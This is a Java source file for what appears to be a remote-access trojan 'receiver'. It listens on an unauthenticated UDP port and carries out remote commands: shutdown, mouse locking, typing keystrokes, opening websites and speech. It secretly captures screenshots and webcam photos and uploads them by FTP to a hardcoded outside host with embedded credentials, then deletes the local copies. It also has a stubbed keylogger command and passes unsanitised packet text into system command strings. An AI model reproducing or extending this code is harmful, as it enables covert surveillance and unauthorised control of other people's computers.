package receiver;

import java.awt.AWTException;
import java.awt.Desktop;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;

public class Main {
	public static boolean locked = true;
	public static int mouseX, mouseY;
	public static final int port = 8556;

	public static void main(String[] args) {
		Runnable mouseLock = new Runnable() {
			public void run() {
				Toolkit tk = Toolkit.getDefaultToolkit();
				if (mouseX > tk.getScreenSize().width) {
					mouseX = tk.getScreenSize().width;
				} else if (mouseX < 0) {
					mouseX = 0;
				}
				if (mouseY > tk.getScreenSize().height) {
					mouseY = tk.getScreenSize().height;
				} else if (mouseY < 0) {
					mouseY = 0;
				}
				while (locked) {
					Robot r = null;
					try {
						r = new Robot();
					} catch (AWTException e) {
						e.printStackTrace();
					}

					r.mouseMove(mouseX, mouseY);
				}
			}
		};

		Thread mouseLocker = new Thread(mouseLock);

		DatagramSocket socket = null;
		try {
			socket = new DatagramSocket(port);
			System.out.println("Warte auf Pakete... Port: " + port);
		} catch (SocketException e1) {
			e1.printStackTrace();
		}
		boolean running = true;
		byte[] data = new byte[1024];
		DatagramPacket packet = new DatagramPacket(data, data.length);
		while (running) {
			try {
				socket.receive(packet);
			} catch (IOException e) {
				e.printStackTrace();
			}
			String message = new String(packet.getData(), 0, packet.getLength());
			message = message.replace("", "");
			System.out.println(message);

			if (message.startsWith("CheckIfOnline;")) { // Reply to request
				DatagramSocket senderSocket = null;
				try {
					senderSocket = new DatagramSocket();
					Thread.sleep(500);
					sendData("IMONLINE;", senderSocket, InetAddress.getByName(packet.getAddress().getHostAddress()),
							port);
				} catch (SocketException | UnknownHostException e) {
					e.printStackTrace();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			} else if (message.startsWith("ChangeVol;")) {
				double factor = Double.parseDouble(message.split(";")[1]) / 100 * 65535;
				runSystemCommand("sysapi.exe changesysvolume " + (int) factor);
			} else if (message.startsWith("OpenDrive;")) {
				runSystemCommand("sysapi.exe cdrom open " + message.split(";")[1] + ":");
			} else if (message.startsWith("SetVol;")) {
				double factor = Double.parseDouble(message.split(";")[1]) / 100 * 65535;
				runSystemCommand("sysapi.exe setsysvolume " + (int) factor);
			} else if (message.startsWith("stop;")) {
				System.exit(0);
			} else if (message.startsWith("MonitorOff;")) {
				runSystemCommand("sysapi.exe monitor off");
			} else if (message.startsWith("LockMouse;")) {
				mouseX = Integer.parseInt(message.split(";")[1]);
				mouseY = Integer.parseInt(message.split(";")[2]);
				locked = true;
				mouseLocker.start();
			} else if (message.startsWith("UnlockMouse;")) {
				try {
					locked = false;
					mouseLocker.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			} else if (message.startsWith("Speak;")) {
				runSystemCommand("sysapi.exe speak text \"" + message.split(";")[1] + "\"");
			} else if (message.startsWith("Shutdown;")) {
				runSystemCommand("sysapi.exe exitwin poweroff");
			} else if (message.startsWith("Website;")) {
				try {
					Desktop.getDesktop().browse(new URI(message.split(";")[1]));
				} catch (IOException | URISyntaxException e) {
					e.printStackTrace();
				}
			} else if (message.startsWith("Screenshot;")) {
				Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				BufferedImage capture;
				try {
					capture = new Robot().createScreenCapture(screenRect);
					ImageIO.write(capture, "jpg", new File(".\\scr.jpg"));
					uploadToFTPServer("scr");
				} catch (IOException | AWTException e) {
					e.printStackTrace();
				}
			} else if (message.startsWith("startKeyLogger;")) {
				// TODO keylog
			} else if (message.startsWith("webcam;")) {
				try {
					Webcam webcam = Webcam.getDefault();
					webcam.setViewSize(WebcamResolution.VGA.getSize());
					webcam.open();
					ImageIO.write(webcam.getImage(), "JPG", new File("boinnk.jpg"));
					webcam.close();
					uploadToFTPServer("boinnk");
				} catch (IOException | NullPointerException e) {
					e.printStackTrace();
				}
			} else if (message.startsWith("typeText;")) {
				try {
					Robot r = new Robot();
					type(message.split(";")[1], r);
				} catch (AWTException e) {
					e.printStackTrace();
				}
			} else {
				System.out.println("Shit happens " + message);
			}
		}
	}

	public static void runSystemCommand(String command) {
		try {
			System.out.println("Execute: " + command);
			Runtime.getRuntime().exec(command);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static void sendData(String command, DatagramSocket socket, InetAddress ipAdress, int port) {
		DatagramPacket packet = new DatagramPacket(command.getBytes(), command.getBytes().length, ipAdress, port);
		try {
			socket.send(packet);
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.out.println("Send data to \t" + ipAdress + ":" + port + "\t message: " + command);
	}

	private static void uploadToFTPServer(String file) {
		String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
		String host = "riptosscreencorn.bplaced.net";
		String user = "riptosscreencorn_screenuploader";
		String pass = "passwort";
		String filePath = ".\\" + file + ".jpg"; // ".\\scr.jpg";
		SimpleDateFormat dateFormat = new SimpleDateFormat("HH_mm_ss");
		Date d = new Date();
		String uploadPath = file + "_" + dateFormat.format(d) + ".jpg";

		ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
		try {
			URL url = new URL(ftpUrl);
			// System.out.println(url);
			URLConnection conn = url.openConnection();
			OutputStream outputStream = conn.getOutputStream();
			FileInputStream inputStream = new FileInputStream(filePath);

			byte[] buffer = new byte[1024];
			int bytesRead = -1;
			while ((bytesRead = inputStream.read(buffer)) != -1) {
				outputStream.write(buffer, 0, bytesRead);
			}

			inputStream.close();
			outputStream.close();
			new File(filePath).delete();
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	private static void type(String text, Robot robot) {
		char c;
		for (int i = 0; i < text.length(); i++) {
			c = text.charAt(i);
			if (c <= 31 || c == 129) {
				pressControlKey(c, robot);
			} else {
				typeAsciiCode(c, robot);
			}
		}
	}

	private static void pressControlKey(char c, Robot robot) {
		robot.keyPress(c);
		robot.keyRelease(c);
	}

	private static void typeAsciiCode(char c, Robot robot) {
		robot.keyPress(KeyEvent.VK_ALT);
		String asciiCode = Integer.toString(c);
		for (int i = 0; i < asciiCode.length(); i++) {
			c = (char) (asciiCode.charAt(i) + '0');
			robot.keyPress(c);
			robot.keyRelease(c);
		}
		robot.keyRelease(KeyEvent.VK_ALT);
	}
}
